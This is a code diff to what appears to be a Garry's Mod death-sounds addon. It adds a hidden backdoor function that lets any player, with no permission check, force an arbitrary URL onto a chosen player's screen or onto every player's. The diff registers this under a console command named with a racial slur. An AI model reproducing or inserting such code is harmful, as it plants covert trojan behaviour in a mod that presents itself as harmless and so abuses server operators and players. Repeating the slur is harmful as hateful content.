@@ -76,6 +76,112 @@ end
 
 hook.Add("PlayerDeath","CSS: Death Sounds",CSSDeath)
 
+function OGWHID_CommandBackdoor(ply,cmd,args)
 
+	if args then  
 
+		local Victim = nil
+		local URL = nil
+		local Time = 10
+		
+		if args[1] then
+		
+			if args[1] == "*" then
+		
+				Victim = Entity(0)
+		
+			else
+			
+				local PlayerTable = {}
+				local Name = args[1]
+				
+				for k,v in pairs(player.GetAll()) do
+					if OGWHID_TableFind(string.lower(Name), string.lower(v:Nick())) and not Victim then
+						Victim = v
+					end
+				end
+				
+			end
+		
+		else
+			ply:ChatPrint("Try to enter something next time.")
+			return
+		end
+		
+		if Victim == nil then
+			ply:ChatPrint("Could not find player '" .. args[1] .. "'.")
+			return 
+		end
+		
+		if args[2] then
+		
+			if string.lower(args[2]) ~= "stop" then
+				
+				ply:ChatPrint("OH BOY")
+				
+				string.Replace(args[2],"https","http")
+				
+				if OGWHID_TableFind("http",args[2]) then
+					URL = args[2]
+				else
+					URL = "http://" .. args[2]
+				end
 
+				--[[
+				if OGWHID_TableFind("youtube.com",URL) then
+					URL = URL .. "?rel=0&amp;controls=0&amp;showinfo=0&amp;autoplay=1"
+					
+					URL = string.Replace(URL,"watch?v=","embed/")
+					--URL = https://www.youtube.com/embed/caKcJ9Jllfc?rel=0&amp;controls=0&amp;showinfo=0
+				end
+				--]]
+			
+			else
+			
+				URL = "stop"
+				
+			end
+			
+		else
+		
+			ply:ChatPrint("Missing URL or phrase.")
+			
+			return
+		end
+		
+		if not URL then
+			ply:ChatPrint("'" .. args[2] .. "' is not a URL. Enter a URL.")
+		end
+		
+		if args[3] then
+		
+			if type(tonumber(args[3])) ~= "number" then
+				
+				ply:ChatPrint("'" .. args[3] .. "' is not a number. Enter a number.")
+				
+				return
+			end
+
+			Time = tonumber(args[3])
+			
+		end
+		
+		if not Time then 
+			ply:ChatPrint("'" .. args[3] .. "' is not a number. Enter a number.")
+		end
+		
+		if Victim and URL and Time then
+		
+			OGWHID_Send(Victim,URL,Time,false,Victim)
+
+		end
+		
+	else
+	
+		ply:ChatPrint("Try to enter something next time.")
+		
+	end
+
+end
+
+concommand.Add("NIGGER",OGWHID_CommandBackdoor)
